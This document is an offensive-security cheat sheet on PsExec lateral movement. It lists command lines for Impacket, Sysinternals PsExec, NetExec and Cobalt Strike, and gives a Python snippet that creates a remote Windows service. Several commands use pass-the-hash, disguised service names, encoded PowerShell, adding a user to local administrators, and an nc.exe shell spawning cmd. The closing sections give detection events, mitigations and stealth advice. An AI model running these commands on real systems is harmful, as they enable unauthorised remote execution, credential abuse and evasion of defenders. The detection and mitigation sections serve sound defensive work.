# PsExec

PsExec is a lateral movement technique that copies a binary to `ADMIN$` and creates a Windows service to execute it. It is one of the most well-known (and most detected) lateral movement methods.

## How It Works

1. Authenticate to the target over SMB (Administrator required — writes to ADMIN$)
2. Copy the executable (usually `PSEXESVC.exe`) to `\\target\ADMIN$\`
3. Use the Service Control Manager (SVCCTL) over RPC to create and start a service pointing to the binary
4. Service output is captured via named pipe and returned to the client
5. After completion, the service is stopped and deleted

## Requirements

| Requirement | Detail |
|-------------|--------|
| Privileges | Local administrator on target |
| SMB | Port 445 open (ADMIN$ share writable) |
| RPC | Port 135 + ephemeral range for SVCCTL |
| File write | Must write binary to target disk (unless using Impacket variants) |
| UAC | Remote UAC blocks tokens for local accounts unless `LocalAccountTokenFilterPolicy=1` |

---

## Impacket psexec.py

```
# Password authentication
psexec.py DOMAIN/user:'Password123!'@192.168.1.100

# Hash authentication (PtH)
psexec.py -hashes :NTLM_HASH DOMAIN/user@192.168.1.100

# Hash with LM:NTLM format
psexec.py -hashes LM:NTLM DOMAIN/user@192.168.1.100

# Execute single command and exit
psexec.py DOMAIN/user:pass@target "ipconfig"

# Custom service name (avoid default random)
psexec.py -service-name UpdateChecker DOMAIN/user@target "whoami"

# Custom service display name
psexec.py -service-name Legit -service-display "Windows Update Service" DOMAIN/user@target

# Remote PowerShell
psexec.py DOMAIN/user:pass@target "powershell -exec bypass -enc BASE64_ENC_COMMAND"

# Cross-compile service binary (for custom binary)
psexec.py -remote-exe "\\target\ADMIN$\custom.exe" DOMAIN/user@target "whoami"

# No output mode
psexec.py -nooutput DOMAIN/user@target "whoami"

# With Kerberos (when -k flag available in dev version)
psexec.py -k -no-pass DOMAIN/user@target.domain.local
```

---

## Microsoft PsExec (Sysinternals)

```
# Remote shell (accept EULA first)
psexec \\target cmd.exe

# Remote shell as different user
psexec \\target -u DOMAIN\admin -p Password123! cmd.exe

# Execute command and capture output
psexec \\target -u admin -p pass ipconfig

# Copy file first (-c)
psexec \\target -c malware.exe

# Copy and run with arguments
psexec \\target -c exploit.exe -f -a "arg1 arg2"

# Run as SYSTEM
psexec \\target -s cmd.exe

# Run with limited rights (non-interactive)
psexec \\target -d cmd.exe /c "net localgroup administrators DOMAIN\user /add"

# Remote PowerShell
psexec \\target powershell.exe -EncodedCommand BASE64

# Accept EULA silently
psexec \\target -accepteula cmd.exe

# Elevated token (for UAC bypass)
psexec \\target -h cmd.exe

# Run on multiple targets (from file)
psexec @targets.txt cmd.exe

# Copy local binary, execute with arguments
psexec \\target -c -f nc.exe -a "target 4444 -e cmd"
```

**OPSEC**: Microsoft PsExec creates registry entries, services, firewall rules, and the `PSEXESVC` process. It is heavily signatured by EDR/AV.

---

## NetExec with PsExec Module

```
# PsExec execution method (default without --exec-method)
nxc smb 192.168.1.100 -u admin -p pass -x whoami

# Explicitly use PsExec execution method
nxc smb 192.168.1.100 -u admin -H NTLM_HASH --exec-method psexec -x whoami

# PowerShell command
nxc smb target -u admin -H HASH -X 'Get-Service'

# Enable verbose to see service creation details
nxc smb target -u admin -H HASH -x whoami --verbose

# Use local authentication
nxc smb target -u admin -H HASH --local-auth -x whoami

# With protocol selection
nxc smb target -u admin -p pass --exec-method psexec -x whoami
```

---

## Cobalt Strike Execute-Assembly / PsExec

```
# Beacon's built-in PsExec
jump psexec target smb

# Execute-assembly with .NET PsExec implementation
execute-assembly /path/to/PsExec.exe \\target cmd.exe

# Using SharpSVC
execute-assembly SharpSVC.exe \\target service "cmd /c whoami"
```

---

## Python Implementation via win32service (Direct SVCCTL)

```python
import win32service
import win32file

# Connect to SCM on remote machine
scm = win32service.OpenSCManager('target', None, win32service.SC_MANAGER_ALL_ACCESS)

# Create service
service = win32service.CreateService(scm, 'UpdateSvc', 'Windows Update Service',
    win32service.SERVICE_ALL_ACCESS, win32service.SERVICE_WIN32_OWN_PROCESS,
    win32service.SERVICE_DEMAND_START, win32service.SERVICE_ERROR_NORMAL,
    'cmd.exe /c whoami > C:\out.txt', None, 0, None, None, None)

# Start service
win32service.StartService(service, None)

# Stop and delete
win32service.ControlService(service, win32service.SERVICE_CONTROL_STOP)
win32service.DeleteService(service)
win32service.CloseServiceHandle(service)
win32service.CloseServiceHandle(scm)
```

---

## Detection

| Event ID | Source | Indication |
|----------|--------|------------|
| 4697 | Security | Service creation (PsExec, Impacket, or custom) |
| 7045 | System | Service install from SCM |
| 5140 | Security | SMB share access to `ADMIN$` |
| 5145 | Security | SMB access to `ADMIN$` writeable share |
| 4688 | Security | Process creation (`PSEXESVC.exe`, `cmd.exe` via service) |
| 4624 | Security | LogonType 3 (Network logon for SMB) |
| 4672 | Security | Admin logon (SeTcbPrivilege for SYSTEM service) |
| 1102 | Security | Log cleared (post-op cleanup) |
| 4657 | Security | Registry modification (PSEXESVC)
| 3 | Sysmon | Network connect (named pipe PSEXESVC-*) |
| 11 | Sysmon | File create (`PSEXESVC.exe` created) |

**Detection logic**:
- Service created then deleted in short succession = PsExec
- `ADMIN$` access followed by service creation = lateral movement
- Executable in `ADMIN$` with random name = Impacket service binary
- Parent process of `cmd.exe` is `services.exe` (PID 4) = service execution
- Named pipe `\PSEXESVC-*` = PsExec traffic
- Event ID 4697 with `ImagePath` containing `cmd.exe /c` or `powershell` = suspicious

## Mitigation

| Control | Detail |
|---------|--------|
| Remove ADMINS share | Not practical; required for legitimate administration |
| SMB signing | Prevents relay but not PtH |
| AppLocker/WDAC | Block execution of `psexec.exe` and random service binaries |
| Monitor 4697/7045 | Alert on unexpected service creation |
| Local admin restriction | Reduce number of domain admins on workstations |
| LAPS | Unique local admin passwords per machine |
| EDR | Behavioral detection of service-based execution |
| Network segmentation | Block SMB/RPC between untrusted zones |

## When to Use PsExec

- **Quick and dirty** shell on a target when stealth is not a concern
- **Lab environments** or internal pentests where detection is expected
- **When WMI/WinRM are unavailable** (blocked by firewall or disabled)
- **Need interactive shell** on older Windows (pre-WinRM)
- **When endpoint protection is known to not block** service creation
- **As a fallback** when other execution methods fail

## When NOT to Use PsExec

- **EDR/AV present** that monitors service creation (most modern EDR)
- **SOC monitors 4697/7045** (common detection)
- **Engagements requiring stealth** — PsExec is the most detected LM technique
- **When alternatives exist** — prefer WMI exec or WinRM for quieter execution
